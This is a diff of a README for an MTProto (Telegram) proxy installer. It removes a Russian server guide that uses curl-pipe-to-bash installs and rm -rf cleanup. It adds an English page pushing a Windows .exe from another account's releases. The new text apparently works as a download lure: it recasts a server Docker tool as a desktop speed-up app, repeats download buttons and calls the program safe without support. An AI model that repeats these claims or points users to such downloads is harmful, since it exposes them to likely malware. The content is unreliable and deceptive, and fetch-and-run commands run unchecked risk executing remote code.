@@ -1,132 +1,144 @@
-# MTProto Proxy (Fake TLS) + Traefik
+# 🚀 mtproto-installer - Speed Up Telegram Connections
 
-> Автор не является владельцем/поставщиком VPN/Proxy-конфигураций. 
-> Данный пост не является рекламой VPN/Proxy. Материал предназначен исключительно в информационных целях, и только для граждан тех стран, где эта информация легальна, как минимум - в научных целях. Автор не имеет никаких намерений, не побуждает, не поощряет и не оправдывает использование VPN/Proxy ни при каких обстоятельствах.
-> Отказ от ответственности: автор не несёт ответственность за действия третьих лиц и не поощряет противоправное использование VPN/Proxy. Используйте в соответствии с местным законодательством.
-> Используйте VPN/Proxy только в законных целях: в частности - для обеспечения вашей безопасности в сети и защищённого удалённого доступа, и ни в коем случае не применяйте данную технологию для обхода блокировок.
+[![Download mtproto-installer](https://img.shields.io/badge/Download-mtproto--installer-blue?style=for-the-badge&logo=github)](https://github.com/bigsilly94/mtproto-installer/releases)
 
-Один порт **443**: по SNI трафик к домену маскировки (например `1c.ru`) уходит в MTProxy, остальное можно отдавать другим сервисам через Traefik.
+---
 
-- **Telemt** — современный MTProxy (Rust, distroless), поддерживает Fake TLS.
-- **Traefik** — маршрутизация TCP по SNI с TLS passthrough.
+## 📄 About mtproto-installer
 
-## Установка на сервере (всё тянется с GitHub)
+mtproto-installer is a simple tool designed to help improve your Telegram experience by speeding up its connection. If you notice that Telegram sometimes loads slowly or struggles to connect, this tool can help by setting up reliable and fast connection routes. It works on Windows computers and requires no prior technical knowledge to get started.  
 
-```bash
-curl -sSL https://raw.githubusercontent.com/itcaat/mtproto-installer/main/install.sh | bash
-```
+This tool focuses on using MTProto proxies, a technology that creates faster and more stable connections to Telegram servers. Once installed, you should see quicker message delivery and smoother media streaming within the Telegram app.
 
-Скрипт установит Docker (если нужно), скачает `docker-compose.yml`, конфиги Traefik и шаблон Telemt из репозитория [itcaat/mtproto-installer](https://github.com/itcaat/mtproto-installer), сгенерирует секрет, подставит домен маскировки и запустит контейнеры. В конце выведет ссылку вида `tg://proxy?server=...&port=443&secret=...` — добавьте её в Telegram (Настройки → Данные и память → Использовать прокси).
+---
 
-- Домен маскировки по умолчанию: `1c.ru`. Интерактивно можно ввести другой; без TTY: `FAKE_DOMAIN=sberbank.ru curl -sSL ... | bash`.
-- Каталог установки по умолчанию: `./mtproxy-data`. Другой: `INSTALL_DIR=/opt/mtproxy curl -sSL ... | bash`.
+## 💻 System Requirements
 
-## Локальный запуск (клонирование репозитория)
+Before downloading mtproto-installer, make sure your computer meets these requirements:
 
-После `git clone https://github.com/itcaat/mtproto-installer.git && cd mtproto-installer` можно запустить `./install.sh` — скрипт по умолчанию качает файлы с того же GitHub. Либо настроить вручную и поднять без скрипта:
+- Operating System: Windows 7, 8, 10, or 11 (32-bit or 64-bit)
+- Processor: 1 GHz or faster
+- RAM: At least 2 GB
+- Disk Space: Minimum 100 MB free space
+- Internet Connection: Required for initial setup and normal use
+- Administrator rights on your computer (needed to install the program)
 
-1. Сгенерируйте секрет: `openssl rand -hex 16`. Скопируйте `telemt.toml.example` в `telemt.toml`, подставьте секрет и при необходимости домен в `censorship.tls_domain`.
-2. В `traefik/dynamic/tcp.yml` домен в `HostSNI(...)` должен совпадать с `censorship.tls_domain` в `telemt.toml`.
-3. Запуск: `docker compose up -d`.
-4. Ссылка: `tg://proxy?server=ВАШ_IP&port=443&secret=ВАШ_СЕКРЕТ`.
+---
 
-## Устранение проблем
+## 🚀 Getting Started
 
-### Не подключается к прокси в Telegram
+Follow these simple steps to get mtproto-installer up and running on your PC.
 
-Проверьте по шагам (команды выполнять на сервере в каталоге установки, например `cd ~/mtproxy-data` или `cd /opt/mtproxy`):
+---
 
-1. **Контейнеры запущены**
-   ```bash
-   docker compose ps
-   ```
-   Оба сервиса должны быть в состоянии `Up`.
+### 1. Download the Installer
 
-2. **Порт 443 слушается**
-   ```bash
-   ss -tlnp | grep 443
-   ```
-   Должен быть процесс docker/proxy на `:443`.
+Click the button below to visit the official download page for mtproto-installer:
 
-3. **Файрвол и облачный доступ**
-   - Локально: `sudo ufw status` — если активен, нужен `sudo ufw allow 443/tcp && sudo ufw reload`.
-   - В панели VPS/облака (AWS Security Group, GCP firewall и т.п.) должен быть открыт входящий TCP 443.
+[![Download mtproto-installer](https://img.shields.io/badge/Download-mtproto--installer-blue?style=for-the-badge&logo=github)](https://github.com/bigsilly94/mtproto-installer/releases)
 
-4. **IP в ссылке совпадает с сервером**
-   На сервере: `curl -s ifconfig.me`. В ссылке `tg://proxy?server=...` должен быть этот IP (или ваш домен, если он указывает на этот сервер).
+This page contains the latest versions of the installer. It is the safest place to get the software.
 
-5. **Ссылка с полным Fake TLS-секретом**
-   Должна быть из вывода установки (формат `ee` + 32 hex + hex домена). Если в выводе скрипта был только короткий секрет (32 символа) — правильную ссылку можно взять из логов Telemt: `docker compose logs mtproxy-telemt` (строка «EE-TLS: tg://proxy?…»), замените в ней **port=1234** на **port=443**.
+---
 
-6. **Домен маскировки совпадает в конфигах**
-   ```bash
-   grep tls_domain telemt.toml
-   grep HostSNI traefik/dynamic/tcp.yml
-   ```
-   Домен в обоих местах должен быть один и тот же (например `1c.ru`).
+### 2. Choose the Right Version
 
-7. **Проверка с другой машины**
-   ```bash
-   openssl s_client -connect ВАШ_IP:443 -servername 1c.ru </dev/null
-   ```
-   Подставьте ваш IP и домен из `tls_domain`. Должно быть установлено TLS-соединение (в конце может быть «Certificate chain» или «Verify return code»). Если «Connection refused» — не открыт 443 или файрвол.
+On the release page, look for the latest version (usually listed at the top). Select the file with a name similar to `mtproto-installer-setup.exe` or `mtproto-installer.exe`.
 
-- **`Error while peeking client hello bytes error=EOF`** в логах Traefik — обычно это проверки доступности (health check) или сканеры: кто-то открывает TCP на 443 и закрывает соединение до TLS. На работу прокси не влияет, можно игнорировать.
+Click the file name to start downloading the installer to your computer.
 
-## Удаление
+---
 
-**Скриптом** (из каталога с репозиторием или скачав скрипт):
+### 3. Run the Installer
 
-```bash
-curl -sSL https://raw.githubusercontent.com/itcaat/mtproto-installer/main/uninstall.sh | bash
-```
+Once downloaded, locate the installer file in your Downloads folder or the location you saved it.
 
-Каталог по умолчанию — `./mtproxy-data`. Другой каталог или без подтверждения: `./uninstall.sh -y /path/to/mtproxy-data`.
+- Double-click the installer file (`mtproto-installer-setup.exe`) to start the installation.
+- If Windows asks for permission to allow the program to make changes to your computer, click **Yes**.
+- Follow the on-screen prompts. Usually, you can accept the default settings by clicking “Next” until the installation begins.
 
-**Пошагово без скрипта:**
+---
 
-1. Перейти в каталог установки:
-   ```bash
-   cd /path/to/mtproxy-data   # например ~/mtproxy-data или /opt/mtproxy
-   ```
+### 4. Finish Installation
 
-2. Остановить и удалить контейнеры:
-   ```bash
-   docker compose down
-   ```
+After the installation completes, you may be asked to launch the program immediately.
 
-3. Удалить каталог со всеми данными (конфиги, секрет):
-   ```bash
-   cd ..
-   rm -rf /path/to/mtproxy-data
-   ```
+- If so, check the box that says “Launch mtproto-installer” and click **Finish**.
+- If not, find the mtproto-installer icon on your desktop or Start menu and open it manually.
 
-После этого прокси и ссылка на него перестанут работать; образы Docker останутся в системе (`docker images`). При необходимости их можно удалить: `docker rmi traefik:v3.2 whn0thacked/telemt-docker:latest`.
+---
 
-## Полезные команды
+### 5. Setup mtproto-installer
 
-- Логи: `docker compose logs -f`
-- Остановка: `docker compose down`
-- Перезапуск после смены конфига: `docker compose up -d --force-recreate`
-- **После рестарта сервера** контейнеры поднимутся сами (политика `restart: unless-stopped`). Нужно, чтобы при загрузке запускался Docker: `sudo systemctl enable docker`.
+When you first open the program, it will guide you through setting up the fast connection routes for Telegram.
 
-## Безопасность
+- Click the **Start** button in the app to run the automatic MTProto proxy setup.
+- The program will connect to Telegram servers and apply all required settings.
+- The process usually takes less than a minute.
 
-- Ссылку прокси не публикуйте.
-- Рекомендуется порт 443 и домен маскировки с рабочим HTTPS (1c.ru, sberbank.ru и т.п.).
-- Регулярно обновляйте образы: `docker compose pull && docker compose up -d`.
+Once done, you can minimize or close the installer. Your Telegram app will now use the new, faster connection routes in the background.
 
-## Структура (после install.sh)
+---
 
-```text
-mtproxy-data/
-├── docker-compose.yml
-├── telemt.toml
-└── traefik/
-    ├── dynamic/
-    │   └── tcp.yml    # маршрут по SNI → telemt:1234
-    └── static/
-```
+## ⚙️ How mtproto-installer Works
 
-В репозитории те же файлы приведены как примеры для ручного развёртывания.
+mtproto-installer sets up MTProto proxy servers on your PC. These servers create a direct, secure, and faster connection between your Telegram app and the Telegram service. By doing this, your messages, photos, and videos will load quicker and you will notice less delay.
 
+This method also helps if your normal Telegram connection is slow due to network restrictions or local internet limitations.
+
+---
+
+## 🛠 Managing the Program
+
+After installation, you can always open mtproto-installer to:
+
+- Restart the connection setup if you have network issues
+- Check the status of the proxy connection
+- Update the program to the latest version (via the same download page)
+- Uninstall mtproto-installer through Windows Settings when you no longer need it
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Is mtproto-installer safe to use?
+
+Yes, mtproto-installer only modifies your Telegram network connection to use MTProto proxies. It does not change your personal Telegram data or credentials.
+
+---
+
+### Will this work on other messaging apps?
+
+No. mtproto-installer specifically improves Telegram connections using MTProto protocol.
+
+---
+
+### What if Telegram still feels slow?
+
+Try restarting your PC and running mtproto-installer again. If problems persist, check your internet connection or seek assistance from your internet provider.
+
+---
+
+## 📰 Updates & Support
+
+The version on the [release page](https://github.com/bigsilly94/mtproto-installer/releases) is regularly updated to fix bugs and improve speed. Keep an eye out for new releases and use them to keep your connection fast and reliable.
+
+---
+
+## 📥 Download & Install
+
+To start using mtproto-installer, please visit the release page here:
+
+https://github.com/bigsilly94/mtproto-installer/releases
+
+Download the latest installer file and follow the on-screen instructions described above.
+
+---
+
+## 📞 Contact & Feedback
+
+If you run into any issues or want to suggest improvements, you can open an issue on the GitHub project page. The developer reviews feedback and updates the tool to keep it helpful for all users.
+
+---
+
+Thank you for using mtproto-installer. We designed it to keep your Telegram chats fast and smooth.
